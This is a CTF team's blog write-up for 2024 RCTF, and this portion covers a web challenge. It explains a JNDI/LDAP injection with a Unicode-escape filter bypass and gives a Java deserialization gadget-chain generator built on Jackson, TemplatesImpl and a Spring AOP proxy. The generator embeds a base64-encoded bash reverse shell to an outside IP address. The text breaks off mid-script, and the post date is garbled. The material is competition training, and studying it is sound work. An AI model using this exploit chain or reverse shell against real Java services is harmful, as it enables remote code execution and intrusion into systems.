<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2024 RCTF SU WriteUp -</title><meta name=description content="æœ¬æ¬¡RCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 RCTFçš„ writeupã€‚"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/rctf-2024-su-wu\/","name":"2024 rctf su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2024 RCTF SU WriteUp","description":"æœ¬æ¬¡RCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚\nä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 RCTFçš„ writeupã€‚\n","inLanguage":"en","wordCount":3428,"datePublished":"2024-05-27T23:15:34\u002b00:00","dateModified":"2024-05-27T23:15:34\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["RCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/rctf-2024-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2024 RCTF SU WriteUp"><meta property="og:description" content="æœ¬æ¬¡RCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 RCTFçš„ writeupã€‚"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/rctf-2024-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2024 RCTF SU WriteUp"><meta name=twitter:description content="æœ¬æ¬¡RCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 RCTFçš„ writeupã€‚"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2024 RCTF SU WriteUp</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on May 27, 270534
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;17&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3428&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>web</a><ul><li><a href=#openyoureyestoseetheworld>OpenYourEyesToSeeTheWorld</a></li><li><a href=#proxy>Proxy</a></li><li><a href=#colorsolved>color(Solved)</a></li><li><a href=#what_-solved><strong>what_is_love</strong> <strong>(Solved)</strong></a></li><li><a href=#nosandbox>nosandbox</a></li></ul></li><li><a href=#misc>misc</a><ul><li><a href=#logo-signin-solved>Logo: Signin (Solved)</a></li><li><a href=#s1ayth3sp1re-solved>s1ayth3sp1re (Solved)</a></li><li><a href=#sec-image-solved->sec-image ï¼ˆsolved ï¼‰</a></li></ul></li><li><a href=#pwn>pwn</a><ul><li><a href=#taskgo-solved>Taskgo (Solved)</a></li><li><a href=#mine-solved>Mine (Solved)</a></li><li><a href=#dwebp-solved>Dwebp (Solved)</a></li></ul></li><li><a href=#reverse>reverse</a><ul><li><a href=#bloker_vm>bloker_vm</a></li><li><a href=#2048>2048</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#signsystem>SignSystem</a></li><li><a href=#hello-xctf>Hello, XCTF!</a></li><li><a href=#d>DÂ³</a></li><li><a href=#mersenne>Mersenne</a></li><li><a href=#l>LÂ³</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>æœ¬æ¬¡RCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_<a href=mailto:xctf@126.com>xctf@126.com</a> æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚</p><p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 RCTFçš„ writeupã€‚</p><h1 id=web>web</h1><h2 id=openyoureyestoseetheworld>OpenYourEyesToSeeTheWorld</h2><p>æ ¹æ®é¢˜ç›®æºç æ˜“çŸ¥æ˜¯JNDIä¸­çš„LDAPæ³¨å…¥</p><p><img src=/img/2024-05-27-RCTF/46c26df9a8577c9cdf77aae4af49f1f1.png alt=img></p><p>æŸ¥çœ‹å®¹å™¨ä¸­javaç‰ˆæœ¬ï¼Œé«˜ç‰ˆæœ¬ä¸€èˆ¬éƒ½æ˜¯æ‰“ååºåˆ—åŒ–</p><p><img src=/img/2024-05-27-RCTF/09dbc0f7779d7896470f8ffc876d936d.png alt=img></p><p>ä¾èµ–åªæœ‰SpringBootï¼Œé‚£åªå‰©ä¸‹JacksonåŸç”Ÿååºåˆ—åŒ–è¿™æ¡é“¾å­</p><p><img src=/img/2024-05-27-RCTF/1ae88573acbc157fb7bf1443a68dcb25.png alt=img></p><p>è€Œå¦‚ä½•è§¦å‘obj.decodeObject()æ–¹æ³• å’Œ ç»•è¿‡æ£€æµ‹æˆäº†å…³é”®</p><p><img src=/img/2024-05-27-RCTF/65e10ec43957abff3dbb183248e33bd3.png alt=img></p><p><img src=/img/2024-05-27-RCTF/421edc7a9ebe6cf69aa23245d5d0ea01.png alt=img></p><p>ç»•è¿‡æ£€æµ‹å¯ä»¥ç”¨Unicodeç¼–ç ç»•è¿‡ä¾‹å¦‚<code>\u003d</code> æ›¿ä»£ <code>=</code>ç­‰</p><p>obj.decodeObject()æ–¹æ³•æœ‰ä¸‰å¤„è°ƒç”¨</p><p><img src=/img/2024-05-27-RCTF/ffdea279dbcf5db7ff9c077e7124e3f5.png alt=img></p><p>c_lookup() æ–¹æ³•æœ‰5å¤„è°ƒç”¨</p><p><img src=/img/2024-05-27-RCTF/511dc91db5ed3d0b02f1151d7a97bf92.png alt=img></p><p>c_resolveIntermediate_nns() æ–¹æ³•æœ‰3å¤„è°ƒç”¨</p><p><img src=/img/2024-05-27-RCTF/54f66b7db91c9b25a2942b01953f7055.png alt=img></p><p>åŠ¨è°ƒå‘ç°æ­£å¸¸çš„payload æ— æ³•è¾¾åˆ° c_resolveIntermediate_nns() æ–¹æ³•ï¼Œå› ä¸ºtail å˜é‡ä¸ºç©º</p><p><img src=/img/2024-05-27-RCTF/caefee5ee6854594b0e273f148ddbc46.png alt=img></p><p>è¿›å…¥p_parseComponent() æ–¹æ³•ï¼ŒæŸ¥çœ‹tail å±æ€§çš„è§£æ</p><p><img src=/img/2024-05-27-RCTF/a2d3802e41f4223abd0262e4f48937a0.png alt=img></p><p><img src=/img/2024-05-27-RCTF/88465060dc6397b6e62a5bfca4b1d89f.png alt=img></p><p>äº†è§£è¿™äº›åï¼Œå³å¯æ„é€ payloadäº†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;ip&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;vps&gt;&#34;</span><span class=p>,</span><span class=nt>&#34;port&#34;</span><span class=p>:</span><span class=mi>9999</span><span class=p>,</span><span class=nt>&#34;searchBase&#34;</span><span class=p>:</span><span class=s2>&#34;dc\u003djavasec,dc\u003deki,dc\u003dxyz\u002f0&#34;</span><span class=p>,</span><span class=nt>&#34;filter&#34;</span><span class=p>:</span><span class=s2>&#34;\u0028cn\u003dtest\u0029&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç”Ÿæˆé“¾å­çš„è„šæœ¬</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>ctf</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.fasterxml.jackson.databind.node.POJONode</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.framework.AdvisedSupport</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.management.BadAttributeValueExpException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.xml.transform.Templates</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Poc0</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>ctClass0</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;com.fasterxml.jackson.databind.node.BaseJsonNode&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtMethod</span><span class=w> </span><span class=n>writeReplace</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctClass0</span><span class=p>.</span><span class=na>getDeclaredMethod</span><span class=p>(</span><span class=s>&#34;writeReplace&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctClass0</span><span class=p>.</span><span class=na>removeMethod</span><span class=p>(</span><span class=n>writeReplace</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctClass0</span><span class=p>.</span><span class=na>toClass</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>ctClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;a&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>superClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctClass</span><span class=p>.</span><span class=na>setSuperclass</span><span class=p>(</span><span class=n>superClass</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtConstructor</span><span class=w> </span><span class=n>constructor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CtConstructor</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>CtClass</span><span class=o>[]</span><span class=p>{},</span><span class=n>ctClass</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>constructor</span><span class=p>.</span><span class=na>setBody</span><span class=p>(</span><span class=s>&#34;Runtime.getRuntime().exec(\&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMTk5LjM2LjE1OC85MDAyIDA+JjE=}|{base64,-d}|{bash,-i}\&#34;);&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctClass</span><span class=p>.</span><span class=na>addConstructor</span><span class=p>(</span><span class=n>constructor</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctClass</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Templates</span><span class=w> </span><span class=n>templatesImpl</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_bytecodes&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>bytes</span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;test&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_tfactory&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//åˆ©ç”¨ JdkDynamicAopProxy è¿›è¡Œå°è£…ä½¿å…¶ç¨³å®šè§¦å‘</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>cons</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>AdvisedSupport</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>cons</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AdvisedSupport</span><span class=w> </span><span class=n>advisedSupport</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>AdvisedSupport</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>advisedSupport</span><span class=p>.</span><span class=na>setTarget</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>handler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>cons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>advisedSupport</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>proxyObj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Proxy</span><span class=p>.</span><span class=na>newProxyInstance</span><span class=p>(</span><span class=n>clazz</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>(),</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w> </span><span class=n>handler</span><span class=p>);</span><span class=w>
